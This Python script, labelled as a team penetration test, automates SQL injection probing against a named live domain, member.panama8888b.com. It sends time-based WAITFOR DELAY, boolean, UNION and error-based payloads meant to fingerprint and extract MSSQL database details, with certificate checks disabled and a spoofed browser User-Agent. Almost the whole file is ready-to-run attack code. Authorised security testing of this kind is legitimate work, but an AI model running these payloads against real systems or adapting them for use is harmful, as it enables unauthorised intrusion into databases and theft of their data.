#!/usr/bin/env python3

"""
Manual SQL Injection Testing Script
Based on successful curl tests that showed time delays
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import sys
import json
import warnings

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class ManualSQLTester:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.session.verify = False
        
    def test_payload(self, payload, description):
        """Test a SQL injection payload"""
        print(f"\n[*] Testing: {description}")
        print(f"[*] Payload: {payload}")
        
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            start_time = time.time()
            response = self.session.get(url, timeout=30)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            print(f"[+] Response Time: {response_time:.3f} seconds")
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Content Length: {len(response.content)} bytes")
            
            # Check for SQL errors in response
            error_indicators = ['error', 'sql', 'syntax', 'database', 'mysql', 'mssql', 'oracle', 'exception']
            content_lower = response.text.lower()
            
            for indicator in error_indicators:
                if indicator in content_lower:
                    print(f"[!] Potential SQL error indicator found: {indicator}")
            
            return response_time, response.status_code, response.text[:500]
            
        except requests.exceptions.Timeout:
            print("[!] Request timed out - possible successful injection")
            return 30.0, 0, "TIMEOUT"
        except Exception as e:
            print(f"[!] Error: {e}")
            return 0, 0, str(e)
    
    def run_tests(self):
        """Run comprehensive SQL injection tests"""
        print("="*60)
        print("Manual SQL Injection Testing Tool")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*60)
        
        # Test baseline
        print("\n[*] Running baseline test...")
        baseline_time, _, _ = self.test_payload("25.1", "Baseline - Normal Request")
        
        # Test payloads that worked in curl
        payloads = [
            # Time-based payloads (MSSQL)
            ("25.1)) WAITFOR DELAY '0:0:5' --", "Time-based - WAITFOR DELAY 5 sec"),
            ("25.1)) WAITFOR DELAY '0:0:3' --", "Time-based - WAITFOR DELAY 3 sec"),
            ("25.1)) WAITFOR DELAY '0:0:1' --", "Time-based - WAITFOR DELAY 1 sec"),
            
            # Boolean-based payloads
            ("25.1)) AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --", "Boolean - INFORMATION_SCHEMA check"),
            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 --", "Boolean - sysobjects check"),
            ("25.1)) AND 1=1 --", "Boolean - True condition"),
            ("25.1)) AND 1=2 --", "Boolean - False condition"),
            
            # UNION-based payloads
            ("25.1)) UNION SELECT @@version --", "UNION - Database version"),
            ("25.1)) UNION SELECT DB_NAME() --", "UNION - Database name"),
            ("25.1)) UNION SELECT USER_NAME() --", "UNION - Current user"),
            
            # Error-based payloads
            ("25.1)) AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --", "Error-based - Version extraction"),
            ("25.1)) AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --", "Error-based - EXTRACTVALUE"),
            
            # Advanced payloads
            ("25.1)) AND (SELECT SUBSTRING(@@version,1,1))='M' --", "Boolean - Version check (Microsoft)"),
            ("25.1)) AND LEN(DB_NAME())>3 --", "Boolean - Database name length"),
            
            # Additional MSSQL specific payloads
            ("25.1)) AND (SELECT COUNT(*) FROM master..sysdatabases)>0 --", "Boolean - Master database check"),
            ("25.1)) AND (SELECT TOP 1 name FROM master..sysdatabases) IS NOT NULL --", "Boolean - Database name extraction"),
            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects)>0 --", "Boolean - sysobjects count"),
        ]
        
        results = []
        
        for payload, description in payloads:
            response_time, status_code, content = self.test_payload(payload, description)
            
            # Analyze results
            is_vulnerable = False
            vulnerability_type = ""
            
            if "WAITFOR DELAY" in payload and response_time > (baseline_time + 2):
                is_vulnerable = True
                vulnerability_type = "Time-based"
                print(f"[!] VULNERABLE - Time delay detected!")
            elif status_code != 200 and status_code != 0:
                is_vulnerable = True
                vulnerability_type = "Status code anomaly"
                print(f"[!] POTENTIAL VULNERABILITY - Unusual status code")
            elif any(error in content.lower() for error in ['error', 'sql', 'syntax', 'exception']):
                is_vulnerable = True
                vulnerability_type = "Error-based"
                print(f"[!] POTENTIAL VULNERABILITY - SQL error detected")
            
            results.append({
                'payload': payload,
                'description': description,
                'response_time': response_time,
                'status_code': status_code,
                'vulnerable': is_vulnerable,
                'vulnerability_type': vulnerability_type,
                'content_preview': content
            })
            
            time.sleep(1)  # Rate limiting
        
        # Summary
        print("\n" + "="*60)
        print("SUMMARY OF RESULTS")
        print("="*60)
        
        vulnerable_count = sum(1 for r in results if r['vulnerable'])
        print(f"Total tests: {len(results)}")
        print(f"Potentially vulnerable: {vulnerable_count}")
        
        if vulnerable_count > 0:
            print("\n[!] VULNERABLE PAYLOADS FOUND:")
            for result in results:
                if result['vulnerable']:
                    print(f"  - {result['description']}")
                    print(f"    Type: {result['vulnerability_type']}")
                    print(f"    Payload: {result['payload']}")
                    print(f"    Response time: {result['response_time']:.3f}s")
                    print(f"    Status code: {result['status_code']}")
                    print()
        else:
            print("\n[+] No obvious vulnerabilities detected in this test.")
            print("[+] Consider running with different payloads or techniques.")
        
        return results

if __name__ == "__main__":
    try:
        tester = ManualSQLTester()
        results = tester.run_tests()
        
        # Save results to file
        output_file = 'manual_sql_test_results.json'
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n[+] Results saved to: {output_file}")
        print("[+] Test completed successfully!")
        
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)